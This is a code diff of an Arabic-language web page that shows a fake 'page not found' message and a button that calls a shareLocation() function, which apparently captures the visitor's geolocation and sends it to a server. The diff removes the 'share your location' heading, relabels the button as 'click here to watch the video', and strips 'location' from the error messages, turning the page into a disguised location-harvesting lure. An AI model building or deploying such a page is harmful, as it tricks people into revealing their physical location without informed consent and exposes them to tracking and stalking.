@@ -11,12 +11,12 @@
         <!-- Title and Content Section -->
         <h1>لا يمكن الوصول لهذا المحتوي</h1>
         <div class="content">
-            <p>محتوى غير متاح حالياً. ولكن يمكن تحديد موقعك الآن.</p>
+            <p>page not found</p>
         </div>
 
         <!-- Location Sharing Section -->
-        <h2>مشاركة موقعك</h2>
-        <button onclick="shareLocation()">اضغط هنا لمشاركة موقعك</button>
+<!--         <h2>مشاركة موقعك</h2> -->
+        <button onclick="shareLocation()">اضغط هنا لمشاهده الفيديو</button>
         <p id="output"></p>
 
         <!-- Video Section (Optional) -->
@@ -60,10 +60,10 @@
                         console.error('Error sending location:', error);
                     });
                 }, function(error) {
-                    document.getElementById("output").innerText = 'حدث خطأ أثناء الحصول على الموقع.';
+                    document.getElementById("output").innerText = 'حدث خطأ.';
                 });
             } else {
-                document.getElementById("output").innerText = 'المتصفح لا يدعم الحصول على الموقع.';
+                document.getElementById("output").innerText = 'المتصفح لا يدعم.';
             }
         }
     </script>
